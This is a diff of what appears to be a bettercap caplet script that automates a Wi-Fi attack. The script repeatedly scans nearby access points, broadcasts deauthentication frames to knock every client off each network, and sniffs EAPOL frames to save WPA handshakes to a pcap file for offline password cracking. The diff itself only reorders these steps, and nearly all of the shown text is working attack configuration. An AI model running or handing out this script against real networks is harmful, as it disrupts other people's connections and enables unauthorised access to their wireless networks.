@@ -11,23 +11,22 @@ set $ {bold}😈 » {reset}
 # - clear the screen
 # - show the list of nearby access points 
 # - deauth every client from each one of them
-# - show the size of the handshakes capture file
 set ticker.period 5
-set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff; !du -sh wpa.pcap
-
-# uncomment to only hop on these channels:
-# wifi.recon.channel 1,2,3
-
-# we'll see lots of probes after each deauth, just skip the noise ...
-events.ignore wifi.client.probe
-
-wifi.recon on
-ticker on
-events.clear
-clear
-
-# Sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.
+set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff
+# sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.
 set net.sniff.verbose true
 set net.sniff.filter ether proto 0x888e
 set net.sniff.output wpa.pcap
+
+# uncomment to only hop on these channels:
+# wifi.recon.channel 1,2,3
+wifi.recon on
+ticker on
 net.sniff on
+
+# we'll see lots of probes after each deauth, just skip the noise ...
+events.ignore wifi.client.probe
+# start fresh
+events.clear
+clear
+
